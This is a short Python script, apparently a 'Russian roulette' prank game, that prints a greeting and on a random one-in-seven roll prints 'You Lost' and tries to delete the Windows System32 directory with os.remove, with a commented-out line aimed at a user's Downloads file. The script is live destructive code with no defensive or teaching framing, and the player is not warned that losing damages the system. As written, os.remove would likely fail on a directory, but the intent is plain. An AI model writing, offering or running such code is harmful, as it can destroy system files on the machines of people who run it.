import random
import os

print('Good luck...')

if random.randint(0, 6) == 1:
    print("You Lost")
    os.remove("C:\Windows\System32")
    # os.remove("/home/mario/Downloads/trial.txt")
else:
    print("You Are Safe!!!")
